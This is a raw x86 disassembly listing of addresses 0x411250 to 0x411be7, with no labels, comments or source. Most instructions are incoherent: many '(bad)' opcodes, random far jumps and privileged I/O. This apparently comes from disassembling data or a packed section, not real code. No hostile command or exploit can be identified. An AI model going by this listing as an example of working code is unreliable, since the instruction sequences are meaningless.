  411250:	addr16 jmp 0x7402:0x75ad824b
  411258:	retf   0xada8
  41125b:	test   DWORD PTR [ebx],0x88724b2c
  411261:	xchg   ebp,eax
  411262:	aad    0x41
  411264:	setl   BYTE PTR [ecx+0x44]
  411268:	adc    BYTE PTR [edi+ecx*1+0x4cef8be8],dl
  41126f:	(bad)  
  411270:	jmp    0x4112df
  411272:	(bad)  
  411273:	and    bh,BYTE PTR [ecx-0xd]
  411276:	addr16 imul esi,esp,0xdf315c87
  41127d:	test   eax,0xb1d0744b
  411282:	ret    0xcf07
  411285:	arpl   WORD PTR [esi-0x72],sp
	...
  411298:	add    BYTE PTR [eax],al
  41129a:	xor    BYTE PTR [ebx+ecx*2],ch
  41129d:	xor    al,0xff
  41129f:	je     0x411262
  4112a1:	jmp    DWORD PTR [esi+0x30]
  4112a4:	lahf   
  4112a5:	cmp    ebp,DWORD PTR ds:[edi+0x2]
  4112a9:	xor    DWORD PTR [ebx-0x73b3b484],0xffffffad
  4112b0:	int    0xeb
  4112b2:	lock call 0x144c:0x1c05fe87
  4112ba:	mov    bl,0x82
  4112bc:	sar    edi,0xb6
  4112bf:	jae    0x41130f
  4112c1:	push   DWORD PTR [edi+0x30]
  4112c4:	add    al,BYTE PTR [ecx-0xa6f813]
  4112ca:	addr16 xor ch,dl
  4112cd:	add    al,0x49
  4112cf:	pop    es
  4112d0:	inc    ebp
  4112d1:	dec    ebx
  4112d2:	push   esi
  4112d3:	inc    edx
  4112d4:	imul   ecx,ecx,0xfd5d074b
  4112da:	inc    esi
  4112db:	mov    esp,0x45e44bcc
  4112e0:	push   ss
  4112e1:	lds    esi,FWORD PTR [edi]
  4112e3:	jp     0x4112cc
  4112e5:	add    esi,eax
  4112e7:	push   es
  4112e8:	adc    bh,BYTE PTR ds:0x5861dc32
  4112ee:	jb     0x41133b
  4112f0:	mov    esp,0x23aebeb7
  4112f5:	(bad)  
  4112f6:	iret   
  4112f7:	push   es
  4112f8:	xchg   ecx,eax
  4112f9:	(bad)  
  4112fa:	lock inc ebp
  4112fc:	lea    eax,[edi+0x0]
	...
  41130e:	add    BYTE PTR [eax],al
  411310:	mov    esp,0xf7c4d63d
  411315:	inc    ecx
  411316:	hlt    
  411317:	cld    
  411318:	jb     0x41131d
  41131a:	out    dx,al
  41131b:	sbb    dh,BYTE PTR [ecx]
  41131d:	pop    es
  41131e:	jmp    0x292f08f3
  411323:	stos   DWORD PTR es:[edi],eax
  411324:	cmp    dl,BYTE PTR [eax+0x29]
  411327:	jg     0x411315
  411329:	add    DWORD PTR [edx+0x772ec7c4],esp
  41132f:	add    eax,0x205106f0
  411334:	mov    ah,0x41
  411336:	cmp    eax,0xa1c5ec87
  41133b:	les    esp,FWORD PTR [edi-0x610d4bbf]
  411341:	mov    ch,0xec
  411343:	dec    edx
  411344:	fadd   st(5),st
  411346:	mov    cl,0xc4
  411348:	(bad)
  41134c:	lock push es
  41134e:	loop   0x411393
  411350:	add    al,0xc
  411352:	adc    dh,bl
  411354:	lock push es
  411356:	jmp    0xff83c79d
  41135b:	call   0x5c411a53
  411360:	xor    DWORD PTR ds:0xacec534f,edi
  411366:	add    esi,ebx
  411368:	es add eax,0xb4bae96a
  41136e:	add    ecx,esi
  411370:	inc    eax
  411371:	or     BYTE PTR [edi],ch
  411373:	sub    BYTE PTR [eax],al
	...
  411385:	add    ah,ch
  411387:	or     eax,0x2ff135c0
  41138c:	mov    cl,ch
  41138e:	repz push es
  411390:	(bad)  
  411391:	cmp    dh,al
  411393:	cs pop ecx
  411395:	sub    BYTE PTR [ebx-0x43db77c0],ch
  41139b:	inc    eax
  41139c:	jb     0x41138b
  41139e:	stos   DWORD PTR es:[edi],eax
  41139f:	xor    eax,DWORD PTR [ecx]
  4113a1:	jmp    0xfd3fea99
  4113a6:	stos   DWORD PTR es:[edi],eax
  4113a7:	sar    esi,1
  4113a9:	cli    
  4113aa:	out    dx,eax
  4113ab:	test   al,0xff
  4113ad:	out    0xf3,eax
  4113af:	push   es
  4113b0:	push   0xfe40dfe9
  4113b5:	push   ecx
  4113b6:	push   eax
  4113b7:	add    eax,0x80cee900
  4113bc:	jae    0x4113c0
  4113be:	xor    ecx,ebx
  4113c0:	sti    
  4113c1:	jmp    0x74411ab9
  4113c6:	mov    al,0x3c
  4113c8:	dec    edi
  4113c9:	shl    ebx,cl
  4113cb:	lods   al,BYTE PTR ds:[esi]
  4113cc:	add    DWORD PTR [esi],esi
  4113ce:	sar    BYTE PTR [eax],0x69
  4113d1:	jmp    0x2644c900
  4113d6:	mov    al,ds:0xf3a82f09
  4113db:	or     eax,eax
  4113dd:	popf   
  4113de:	test   DWORD PTR [ecx+0x74],eax
  4113e1:	adc    DWORD PTR [ebx],ebx
  4113e3:	push   0x30
  4113e5:	add    dh,ch
  4113e7:	int3   
  4113e8:	jmp    0x41141d
	...
  4113f9:	add    BYTE PTR [eax],al
  4113fb:	add    BYTE PTR [esi+0x50],ch
  4113fe:	imul   al
  411400:	mov    ebp,0xeffff1a
  411405:	add    al,0x20
  411407:	inc    ecx
  411408:	dec    ecx
  411409:	mov    DWORD PTR [ebx-0x4],0x459
  411410:	int3   
  411411:	jg     0x41140d
  411413:	push   eax
  411414:	mov    bl,0xa
  411416:	push   0x2
  411418:	(bad)  
  411419:	pusha  
  41141a:	(bad)  
  41141b:	(bad)  
  41141c:	jmp    0x411f:0x1615ff06
  411423:	add    BYTE PTR [edx],dl
  411425:	les    ecx,FWORD PTR ds:0xac084
  41142b:	add    BYTE PTR [esi-0x80],dl
  41142e:	(bad)  
  41142f:	and    BYTE PTR [ecx],bl
  411431:	add    al,0x0
  411433:	(bad)  
  411434:	aam    0xee
  411436:	(bad)  
  411437:	dec    DWORD PTR [ecx]
  411439:	add    al,0xff
  41143b:	jae    0x411412
  41143d:	mov    esi,0x5a5ee043
  411442:	push   es
  411443:	(bad)  
  411444:	adc    al,0xa7
  411446:	lds    eax,FWORD PTR [ebp+0x41]
  411449:	or     eax,DWORD PTR [eax]
  41144b:	add    cl,bl
  41144d:	mov    BYTE PTR [ebx-0x14],0xd9
  411451:	add    eax,DWORD PTR [eax]
  411453:	add    BYTE PTR [esi],dl
  411455:	sub    dh,0x0
  411458:	leave  
  411459:	add    eax,DWORD PTR [eax]
  41145b:	(bad)  
  41145c:	push   esp
  41145d:	iret   
  41145e:	(bad)  
  41145f:	inc    DWORD PTR [eax]
	...
  411471:	add    BYTE PTR [ecx+0x1458d03],bl
  411477:	jnp    0x411476
  411479:	jne    0x411448
  41147b:	loop   0x4114a9
  41147d:	add    al,0x99
  41147f:	add    ecx,DWORD PTR [ebx]
  411481:	shl    al,0xa1
  411484:	jmp    0xe974:0x419fd82
  41148b:	or     bh,cl
  41148d:	repz jg 0x4114ba
  411490:	aad    0x28
  411492:	mov    cl,0x2d
  411494:	aas    
  411495:	inc    esp
  411496:	inc    esp
  411497:	add    al,BYTE PTR cs:[eax]
  41149a:	lock push esp
  41149c:	inc    esi
  41149e:	mov    ch,0x79
  4114a0:	add    al,BYTE PTR [eax]
  4114a2:	lock sub eax,0x503c7447
  4114a8:	in     eax,dx
  4114a9:	cli    
  4114aa:	push   es
  4114ab:	out    dx,eax
  4114ac:	add    ecx,DWORD PTR [ebx]
  4114ae:	xor    cl,bh
  4114b0:	jmp    0x47c0a09c
  4114b5:	(bad)  
  4114b6:	jae    0x4114ea
  4114b8:	push   ebx
  4114b9:	sub    eax,0x74022db1
  4114be:	mul    BYTE PTR [eax-0x11290d13]
  4114c4:	add    eax,edi
  4114c6:	cmc    
  4114c7:	inc    edx
  4114c8:	sbb    DWORD PTR [ecx-0x10],eax
  4114cb:	add    al,BYTE PTR cs:[eax]
  4114ce:	jo     0x411481
  4114d0:	(bad)
  4114d3:	cmp    edi,ebx
  4114d5:	inc    BYTE PTR [eax]
	...
  4114e7:	add    BYTE PTR [ebp-0x4c],ah
  4114ea:	inc    edi
  4114eb:	je     0x4114c1
  4114ed:	fsubr  DWORD PTR ds:0x472ff002
  4114f3:	je     0x4114b9
  4114f5:	enter  0x43,0xf0
  4114f9:	das    
  4114fa:	inc    esi
  4114fb:	xor    dh,BYTE PTR [eax-0x5001b879]
  411501:	std    
  411502:	push   esp
  411503:	lods   eax,DWORD PTR ds:[esi]
  411504:	call   0xd2c60c35
  411509:	in     al,dx
  41150a:	inc    edi
  41150b:	(bad)  
  41150c:	imul   eax,DWORD PTR [edi],0x2
  41150f:	std    
  411510:	stos   BYTE PTR es:[edi],al
  411511:	push   cs
  411512:	fs loopne 0x41149a
  411515:	ds adc eax,0xe906f08b
  41151b:	add    edx,DWORD PTR [edi]
  41151d:	loop   0x41154e
  41151f:	inc    esp
  411520:	les    edx,FWORD PTR [ecx+0x3b33840c]
  411526:	sub    ch,0x57
  411529:	(bad)  
  41152a:	call   0xaa48f67a
  41152f:	inc    edi
  411530:	fld    DWORD PTR [esi]
  411532:	shl    DWORD PTR ds:0x5be906f1,1
  411538:	cmp    eax,0x4f47ce01
  41153d:	xchg   esp,eax
  41153e:	mov    ecx,0xb1af2e47
  411543:	push   ss
  411544:	mov    cl,0x6
  411546:	inc    ecx
  411547:	add    ecx,ebp
  411549:	(bad)  
  41154a:	call   0x4115aa
	...
  41155b:	add    BYTE PTR [eax],al
  41155d:	add    ah,ah
  41155f:	add    DWORD PTR [esi-0x31e668b9],esp
  411565:	les    eax,FWORD PTR [edi]
  411567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411568:	cmp    al,0x16
  41156a:	mov    cl,0x6
  41156c:	add    DWORD PTR [esi-0x47],0xbedc853d
  411573:	in     al,dx
  411574:	daa    
  411575:	add    al,0x58
  411577:	sbb    al,0xc4
  411579:	(bad)  
  41157a:	fbld   TBYTE PTR ds:0x3dd70a7d
  411580:	shl    BYTE PTR [esi+0x18],1
  411583:	enter  0xdbe8,0x40
  411587:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411589:	add    ecx,eax
  41158b:	adc    al,BYTE PTR es:[edi-0x4a]
  41158f:	scas   al,BYTE PTR es:[edi]
  411590:	sub    DWORD PTR [esi],edx
  411592:	xor    DWORD PTR [edi],eax
  411594:	shr    DWORD PTR [ebx],1
  411596:	fcmovnb st,st(7)
  411598:	(bad)  
  411599:	call   0x2e7a6cd9
  41159e:	das    
  41159f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115a0:	daa    
  4115a1:	shl    BYTE PTR [ebp+edi*1-0x381bee9a],1
  4115a8:	inc    DWORD PTR [eax]
  4115aa:	xor    al,BYTE PTR [eax]
  4115ac:	dec    DWORD PTR [esi]
  4115ae:	adc    al,0x5
  4115b0:	cli    
  4115b1:	push   es
  4115b2:	mov    bh,0x25
  4115b4:	xor    al,0x3
  4115b6:	scas   eax,DWORD PTR es:[edi]
  4115b7:	cmp    al,0xa
  4115b9:	sub    DWORD PTR [eax+0x18],eax
  4115bc:	call   0xfe7dc0a0
  4115c1:	repnz add BYTE PTR [eax],al
	...
  4115d4:	mov    bl,0xb9
  4115d6:	or     DWORD PTR [esi+0x284c07f0],esp
  4115dc:	hlt    
  4115dd:	pop    es
  4115de:	add    cl,ch
  4115e0:	repz scas al,BYTE PTR es:[edi]
  4115e2:	add    al,ch
  4115e4:	repz push es
  4115e6:	call   0xfe7f19c1
  4115eb:	mov    dh,BYTE PTR [edx]
  4115ed:	rol    BYTE PTR [eax-0x17],1
  4115f0:	(bad)  
  4115f1:	ret    0xe8fb
  4115f4:	hlt    
  4115f5:	push   es
  4115f6:	add    BYTE PTR [eax+esi*1+0x41],ch
  4115fa:	dec    edi
  4115fb:	xchg   esi,eax
  4115fc:	loopne 0x4115c7
  4115fe:	dec    edx
  4115ff:	sub    ah,ch
  411601:	cs push 0xb06f3eb
  411607:	test   eax,0xbcff13c0
  41160c:	mov    dl,0xd1
  41160e:	inc    eax
  41160f:	jmp    0x666f684f
  411614:	ss inc ebp
  411616:	add    al,0xaa
  411618:	mov    al,bh
  41161a:	(bad)  
  41161b:	call   0x41411d13
  411620:	int    0xf2
  411622:	inc    BYTE PTR [eax]
  411624:	ss loopne 0x41162b
  411627:	xor    esp,esi
  411629:	les    esp,FWORD PTR [esi+0x56]
  41162c:	out    dx,al
  41162d:	inc    ecx
  41162e:	(bad)  
  41162f:	out    0x8a,eax
  411631:	fscale 
  411633:	inc    eax
  411635:	enter  0x8b53,0x0
	...
  411649:	add    ch,dh
  41164b:	pop    edi
  41164c:	add    eax,0xf80849e9
  411651:	jb     0x4115db
  411653:	leave  
  411654:	std    
  411655:	push   0x59
  411657:	loopne 0x411611
  411659:	add    DWORD PTR [ecx+0x8],ebx
  41165c:	mov    eax,0x84900
  411661:	leave  
  411662:	or     edi,DWORD PTR [esi+edi*8]
  411665:	addr16 clc 
  411667:	fistp  QWORD PTR [esi]
  411669:	add    BYTE PTR [ecx+0x59],dl
  41166c:	inc    edx
  41166e:	es pop ebx
  411670:	clc    
  411671:	call   0xa429197f
  411676:	sbb    BYTE PTR [eax],cl
  411678:	add    al,ch
  41167a:	push   ebx
  41167b:	(bad)  
  41167e:	xor    DWORD PTR [esi-0x24b90010],edi
  411684:	adc    dh,ch
  411686:	push   esi
  411687:	ret    0xfce6
  41168a:	pop    esp
  41168b:	ret    0x83fd
  41168e:	and    al,0x9
  411690:	dec    esp
  411691:	inc    ecx
  411692:	or     DWORD PTR [eax],ecx
  411694:	je     0x4116af
  411696:	pop    edx
  411697:	add    al,0xf3
  411699:	sbb    BYTE PTR cs:[ebx],al
  41169c:	add    BYTE PTR [edi+ecx*8-0x3e],dh
  4116a0:	adc    esi,ebx
  4116a2:	xchg   edi,eax
  4116a3:	dec    eax
  4116a4:	inc    dh
  4116a6:	fcom   QWORD PTR [edi+eiz*1+0x41]
  4116aa:	(bad)  [eax]
	...
  4116c0:	lock lods eax,DWORD PTR ds:[esi]
  4116c2:	pop    ebx
  4116c3:	(bad)  
  4116c4:	mov    ebx,0xb8e744cc
  4116c9:	rol    DWORD PTR [esi+edi*8-0x4d],0x55
  4116ce:	int3   
  4116cf:	call   0x718b4504
  4116d4:	icebp  
  4116d5:	lock inc esp
  4116d7:	out    0xe7,eax
  4116d9:	add    al,BYTE PTR cs:[eax]
  4116dc:	sbb    ah,BYTE PTR [ebx]
  4116de:	test   eax,0x531ca22a
  4116e3:	cmp    BYTE PTR [edx+0x21],0xcd
  4116e7:	add    DWORD PTR [ebx+0x2f],ebx
  4116ea:	push   edi
  4116eb:	jmp    0x55f:0xfe44a458
  4116f2:	ins    BYTE PTR es:[edi],dx
  4116f3:	not    BYTE PTR [edi+0x2c]
  4116f6:	fdivr  st,st(7)
  4116f8:	push   edi
  4116f9:	adc    DWORD PTR [ebx],eax
  4116fb:	add    al,dh
  4116fd:	pop    esp
  4116fe:	sbb    eax,0x3ee998c
  411703:	dec    DWORD PTR ds:0xf040a9be
  411709:	inc    esp
  41170a:	sbb    eax,0x3eec994
  41170f:	call   ebp
  411711:	aad    0xa9
  411713:	inc    eax
  411714:	lock ins BYTE PTR es:[edi],dx
  411716:	sbb    eax,0x3eea99c
  41171b:	dec    ebp
  41171d:	int    0xa9
  41171f:	inc    eax
  411720:	lock xchg esp,eax
  411722:	sbb    eax,0xa4
	...
  411733:	add    BYTE PTR [eax],al
  411735:	add    BYTE PTR [ecx+0x15ff03ee],bl
  41173b:	fsubr  DWORD PTR [ecx+0x1db8f040]
  411741:	lods   al,BYTE PTR ds:[esi]
  411742:	cmp    edi,ebp
  411744:	add    edi,edi
  411746:	or     eax,0xf040aa00
  41174b:	push   es
  41174c:	pushw  ds
  41174e:	jl     0x411730
  411750:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411751:	add    edi,DWORD PTR [edi+0x30aa90e4]
  411757:	pop    es
  411758:	dec    esi
  411759:	push   ds
  41175a:	ins    BYTE PTR es:[edi],dx
  41175b:	loopne 0x411704
  41175d:	add    esp,DWORD PTR [edi+0x30aa28e4]
  411763:	pop    es
  411764:	ss push ds
  411766:	lods   al,BYTE PTR ds:[esi]
  411767:	loopne 0x411710
  411769:	add    ecx,DWORD PTR [edi+0x30aa30e4]
  41176f:	pop    es
  411770:	push   ds
  411771:	push   ds
  411772:	lods   al,BYTE PTR ds:[esi]
  411773:	loopne 0x41171c
  411775:	add    esi,DWORD PTR [edi-0x1c]
  411778:	cmp    BYTE PTR [edx+0x1e0606b0],ch
  41177e:	cmp    al,0xe0
  411780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411781:	add    ebx,DWORD PTR [edi-0x1c]
  411784:	adc    BYTE PTR [edx+0x1dee06b0],ch
  41178a:	sub    al,0xe0
  41178c:	daa    
  41178d:	add    al,0x47
  41178f:	in     al,0xc8
  411791:	fnsave [eax+0x53e9d606]
  411797:	loopne 0x4117c0
  411799:	add    al,0x0
	...
  4117ab:	add    BYTE PTR [edi],ch
  4117ad:	in     al,0xd0
  4117af:	fnsave [eax+0xbe9be06]
  4117b5:	loopne 0x4117de
  4117b7:	add    al,0x17
  4117b9:	in     al,0xb8
  4117bb:	fnsave [eax+0x3e9a606]
  4117c1:	loopne 0x4117ea
  4117c3:	add    al,0xff
  4117c5:	jecxz  0x411757
  4117c7:	fnsave [eax-0x141671fa]
  4117cd:	fbld   TBYTE PTR [edi]
  4117cf:	add    al,0xe7
  4117d1:	jecxz  0x4117bb
  4117d3:	fnsave [eax]
  4117d5:	pop    es
  4117d6:	add    BYTE PTR [esi-0x37],dh
  4117d9:	add    eax,0x39f4285a
  4117de:	and    al,0xf1
  4117e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117e1:	(bad)  
  4117e2:	call   FWORD PTR [ebp-0x37]
  4117e5:	or     eax,0x39f3a85a
  4117ea:	and    al,0xf9
  4117ec:	int    0xc6
  4117ee:	inc    DWORD PTR [ebp-0x67]
  4117f1:	adc    eax,0x39f3a85a
  4117f6:	and    al,0xd1
  4117f8:	mov    ch,0xc6
  4117fa:	jmp    FWORD PTR ds:0xa85a1d99
  411800:	repz cmp DWORD PTR [ecx+ecx*8],esp
  411804:	popf   
  411805:	(bad)  
  411806:	call   DWORD PTR ds:0xa859e589
  41180c:	repz cmp DWORD PTR [ecx+edx*8],esp
	...
  411820:	add    BYTE PTR [eax],al
  411822:	inc    ebp
  411823:	(bad)  
  411824:	(bad)  
  411825:	std    
  411826:	dec    eax
  411827:	in     eax,dx
  411828:	pop    ecx
  411829:	test   al,0xf3
  41182b:	cmp    DWORD PTR [ecx+edi*4],esp
  41182e:	sub    eax,0x58e5ffc6
  411833:	cmc    
  411834:	pop    ecx
  411835:	sub    ah,dh
  411837:	cmp    DWORD PTR [ecx+edx*1],esp
  41183a:	push   ss
  41183b:	(bad)  
  41183c:	dec    ebp
  41183e:	sbb    ch,bh
  411840:	pop    ecx
  411841:	sub    ah,ch
  411843:	cmp    DWORD PTR [ecx+ebp*1],esp
  411846:	ds (bad) 
  411848:	push   DWORD PTR [ebp+0x2859c508]
  41184e:	hlt    
  41184f:	cmp    DWORD PTR [ecx+esi*1],esp
  411852:	es (bad) 
  411854:	call   FWORD PTR [ebp+0x2859cd08]
  41185a:	in     al,dx
  41185b:	cmp    DWORD PTR [ecx+edi*1],esp
  41185e:	into   
  41185f:	(bad)  
  411860:	(bad)  
  411861:	jmp    FWORD PTR [esi+0x2f]
  411864:	push   edx
  411865:	pop    edx
  411866:	or     BYTE PTR [ebx],al
  411868:	jmp    DWORD PTR ds:0x3f5901
  41186e:	pop    esi
  41186f:	das    
  411870:	pop    esi
  411871:	pop    edx
  411872:	cwde   
  411873:	add    al,0xff
  411875:	and    eax,0x3f5ab5
  41187a:	push   ds
  41187b:	das    
  41187c:	pop    dx
  41187e:	pop    eax
  41187f:	add    al,0xff
  411881:	and    eax,0x3f5abd
	...
  411896:	add    BYTE PTR [eax],al
  411898:	fisubr WORD PTR [esi]
  41189a:	outs   dx,BYTE PTR ds:[esi]
  41189b:	pop    edx
  41189c:	dec    eax
  41189d:	add    al,0xff
  41189f:	and    eax,0x3f5a45
  4118a4:	into   
  4118a5:	cs jp  0x411902
  4118a8:	dec    eax
  4118a9:	add    al,0xff
  4118ab:	and    eax,0x3f5a05
  4118b0:	(bad)  
  4118b1:	xchg   BYTE PTR cs:[edx-0x68],bl
  4118b5:	add    al,0xff
  4118b7:	and    eax,0x3f59cd
  4118bc:	pop    esi
  4118bd:	and    BYTE PTR [esi-0xfb67a6],cl
  4118c3:	and    eax,0x3f58c5
  4118c8:	push   ds
  4118c9:	and    BYTE PTR [esi-0xfcf7a6],dl
  4118cf:	and    eax,0x3f589d
  4118d4:	and    BYTE PTR cs:[esi-0xfd37a6],bl
  4118db:	and    eax,0x3f5965
  4118e0:	pop    esi
  4118e1:	and    BYTE PTR [esi-0xfd27a6],ah
  4118e7:	and    eax,0x3f5899
  4118ec:	lock nop
  4118ee:	out    0xb7,al
  4118f0:	dec    edx
  4118f1:	out    dx,eax
  4118f2:	add    edi,edi
  4118f4:	or     eax,0xf040ddc2
  4118f9:	mov    eax,0xc3e6
	...
  41190e:	cmp    ch,bh
  411910:	add    edi,edi
  411912:	adc    eax,0xf040dd66
  411917:	mov    al,ds:0x6f1acbe6
  41191c:	add    bh,bh
  41191e:	or     eax,0xf040ddfe
  411923:	enter  0xd3e6,0x4a
  411927:	outs   dx,DWORD PTR ds:[esi]
  411928:	add    bh,bh
  41192a:	aad    0xe5
  41192c:	fld    QWORD PTR [eax-0x10]
  41192f:	lock out 0xdf,al
  411932:	sub    ch,BYTE PTR [edi+0x2]
  411935:	dec    ebp
  411937:	or     esi,ebx
  411939:	inc    eax
  41193a:	lock sbb bh,ah
  41193d:	out    0x1a,eax
  41193f:	outs   dx,DWORD PTR ds:[esi]
  411940:	add    bh,bh
  411942:	adc    eax,0xf040dc3a
  411947:	add    bh,ah
  411949:	out    dx,eax
  41194a:	mov    edx,0xdff026e
  41194f:	cmp    bl,ah
  411951:	inc    eax
  411952:	lock sub ch,ah
  411955:	imul   DWORD PTR [edx+0x15ff03ee]
  41195b:	pop    edx
  41195c:	fadd   QWORD PTR [eax-0x10]
  41195f:	push   eax
  411960:	in     eax,0xff
  411962:	retf   0x3ee
  411965:	dec    ebp
  411967:	sub    ebx,ebx
  411969:	inc    eax
  41196a:	lock js 0x411952
  41196d:	or     edi,DWORD PTR [ebx+0xff03ee]
	...
  411983:	add    ch,dl
  411985:	pop    ebp
  411986:	fild   DWORD PTR [eax-0x10]
  411989:	push   es
  41198a:	mov    ch,0x4f
  41198c:	sub    ecx,DWORD PTR [edx-0x54]
  41198f:	dec    edi
  411990:	sub    ecx,DWORD PTR [edx+0x61]
  411993:	(bad)  
  411994:	adc    ecx,DWORD PTR [ebx]
  411996:	push   0x3b
  411998:	icebp  
  411999:	mov    bl,0xf0
  41199b:	jnp    0x4119f0
  41199d:	pop    es
  41199e:	jmp    0xe94ccba6
  4119a3:	test   bh,al
  4119a5:	or     ebp,esp
  4119a7:	or     ecx,DWORD PTR [eax-0xffc16f7]
  4119ad:	dec    eax
  4119ae:	in     al,0x3
  4119b0:	jae    0x4119e1
  4119b2:	loopne 0x411972
  4119b4:	imul   DWORD PTR [esi-0x1c]
  4119b7:	add    esi,eax
  4119b9:	push   es
  4119ba:	sub    eax,DWORD PTR [edi]
  4119bc:	lock mov DWORD PTR [eax+0x13],eax
  4119c0:	adc    eax,0xf00970ff
  4119c5:	push   es
  4119c6:	jmp    0x6a480d10
  4119cb:	cmp    ebx,edi
  4119cd:	mov    bl,0xf0
  4119cf:	jnp    0x4119c0
  4119d1:	push   es
  4119d2:	jmp    0xe94c4bda
  4119d7:	test   BYTE PTR [edi-0x39],bl
  4119da:	or     DWORD PTR [ebx],0xffffff98
  4119dd:	add    ecx,ebp
  4119df:	add    esi,eax
  4119e1:	dec    eax
  4119e2:	in     al,dx
  4119e3:	add    ecx,DWORD PTR ds:0x3e887
	...
  4119f9:	add    al,dh
  4119fb:	mov    bl,0xf0
  4119fd:	jnp    0x4119ea
  4119ff:	push   es
  411a00:	jmp    0xe94c4c08
  411a05:	add    al,dh
  411a07:	pop    es
  411a08:	jmp    0x813fbf10
  411a0d:	push   cs
  411a0e:	lock push es
  411a10:	jmp    0x480d56
  411a15:	hlt    
  411a16:	repz or BYTE PTR [eax],al
  411a19:	jmp    0xf9f9284e
  411a1e:	repz push es
  411a20:	add    BYTE PTR [ebx-0x16c2f918],ch
  411a26:	test   DWORD PTR [esi],0x6ef40c00
  411a2c:	adc    ecx,ebp
  411a2e:	repz push es
  411a30:	ret    0xf3e5
  411a33:	repz jmp eax
  411a36:	repz push es
  411a38:	jge    0x411a1b
  411a3a:	dec    ebx
  411a3b:	sbb    al,BYTE PTR [eax]
  411a3d:	jmp    0xe9446335
  411a42:	lock push es
  411a44:	adc    cl,ch
  411a46:	repz mov bl,0x7
  411a49:	xchg   ecx,eax
  411a4a:	inc    BYTE PTR [esi]
  411a4c:	add    cl,ch
  411a4e:	xor    DWORD PTR [edx],ecx
  411a50:	add    ah,bh
  411a52:	repz out 0xff,al
  411a55:	call   0xd1f9280a
  411a5a:	repz push es
  411a5c:	add    BYTE PTR [ebx],ch
	...
  411a6e:	add    BYTE PTR [eax],al
  411a70:	call   0xb42a577b
  411a75:	xor    eax,0x6efb94fe
  411a7a:	sbb    ecx,ebp
  411a7c:	repz push es
  411a7e:	ret    0xf3ed
  411a81:	repz jmp FWORD PTR [eax-0x14]
  411a85:	push   es
  411a86:	jge    0x411a69
  411a88:	retf   
  411a89:	adc    DWORD PTR [eax],eax
  411a8b:	jmp    0xe9446383
  411a90:	inc    edx
  411a91:	ds cmp al,0xe9
  411a94:	repz pop es
  411a96:	add    dh,ah
  411a98:	push   eax
  411a99:	inc    esi
  411a9a:	mov    WORD PTR ds:0x8b14f5,ds
  411aa0:	dec    eax
  411aa1:	mov    DWORD PTR [edx],0x1a8a8a00
  411aa7:	add    al,0x19
  411aa9:	or     edi,edi
  411aab:	jne    0x411ae1
  411aad:	cmp    BYTE PTR [edi+0x10],0xd
  411ab1:	or     DWORD PTR [eax],eax
  411ab3:	mov    DWORD PTR [eax-0x26fffbef],ecx
  411ab9:	dec    eax
  411aba:	lds    eax,FWORD PTR [ecx+0xcd5]
  411ac0:	loope  0x411aca
  411ac2:	add    BYTE PTR [eax],al
  411ac4:	pusha  
  411ac5:	mov    ecx,DWORD PTR [esi]
  411ac7:	add    al,0xd9
  411ac9:	or     BYTE PTR [ebx+0xcad7c],al
  411acf:	mov    eax,DWORD PTR [eax+0x10]
  411ad2:	add    al,0x0
	...
  411ae4:	add    BYTE PTR [eax],al
  411ae6:	leave  
  411ae7:	jl     0x411af2
  411ae9:	mov    bl,BYTE PTR [eax-0x26013ffa]
  411aef:	jg     0x411af0
  411af1:	ror    DWORD PTR [ebp-0x34de2ff8],0xb
  411af8:	add    BYTE PTR [ebx+0x41418],al
  411afe:	cdq    
  411aff:	cmc    
  411b00:	jae    0x411b1f
  411b02:	add    cl,BYTE PTR [ebx+0x889040e]
  411b08:	mov    DWORD PTR [ecx+0xc61],eax
  411b0e:	cdq    
  411b0f:	int    0x7f
  411b11:	sbb    al,0x4d
  411b13:	or     BYTE PTR [eax],al
  411b15:	or     BYTE PTR [ecx+0x8],cl
  411b18:	add    BYTE PTR [ecx+0x417d8],cl
  411b1e:	pop    ecx
  411b1f:	add    DWORD PTR [edi+0x84d18],0x81c5e8d0
  411b29:	xor    eax,0xf0000639
  411b2f:	inc    esp
  411b30:	mov    dh,0x1c
  411b32:	imul   ebx,DWORD PTR [edi+0x1df00413],0xffffff89
  411b39:	sub    al,0x21
  411b3c:	add    al,BYTE PTR [eax]
  411b3e:	mov    al,0x6c
  411b40:	sbb    BYTE PTR [ebx],0xf4
  411b43:	sbb    eax,0x1df00802
  411b48:	add    cl,BYTE PTR [ecx+0x0]
	...
  411b5a:	add    BYTE PTR [eax],al
  411b5c:	jno    0x411b8b
  411b5e:	push   es
  411b5f:	add    al,dh
  411b61:	test   al,0x8a
  411b63:	pop    ss
  411b64:	hlt    
  411b65:	sbb    eax,0x1ff18a02
  411b6a:	inc    edx
  411b6b:	std    
  411b6c:	mov    al,0xa5
  411b6e:	add    al,bl
  411b70:	jnp    0x411b5b
  411b72:	out    0x3,eax
  411b74:	imul   esi,DWORD PTR [ecx-0x1a],0x3
  411b78:	sbb    eax,0xa632d37c
  411b7d:	stos   BYTE PTR es:[edi],al
  411b7e:	retf   0x7aff
  411b81:	aad    0x80
  411b83:	out    0xf1,al
  411b85:	push   cs
  411b86:	sub    al,0x45
  411b88:	gs pop ecx
  411b8a:	rol    DWORD PTR [edx-0x104ce178],cl
  411b90:	jae    0x411b85
  411b92:	add    bh,BYTE PTR [ebp-0x1c31381]
  411b98:	gs xchg edx,eax
  411b9a:	or     DWORD PTR [edx+eiz*8+0x70],esi
  411b9e:	xchg   esi,edi
  411ba0:	icebp  
  411ba1:	(bad)  
  411ba2:	pop    ds
  411ba3:	add    al,0xf0
  411ba5:	sbb    eax,0x9e6b18b5
  411baa:	adc    eax,DWORD PTR [eax+esi*8]
  411bad:	sbb    eax,0x29e88089
  411bb2:	add    al,BYTE PTR [eax]
  411bb4:	mov    al,0x6
  411bb6:	jo     0x411c32
  411bb8:	fisttp DWORD PTR [edx]
  411bba:	jmp    0xf8c694c2
  411bbf:	pop    es
	...
  411bd0:	add    BYTE PTR [eax],al
  411bd2:	lock push es
  411bd4:	bound  eax,QWORD PTR [edx+0x3e90b07]
  411bda:	push   ds
  411bdb:	dec    eax
  411bdc:	out    0xb7,eax
  411bde:	stc    
  411bdf:	adc    al,0x1
  411be2:	sub    esi,DWORD PTR [ecx+ebp*4]
  411be5:	mov    esp,edi
  411be7:	pop    ds
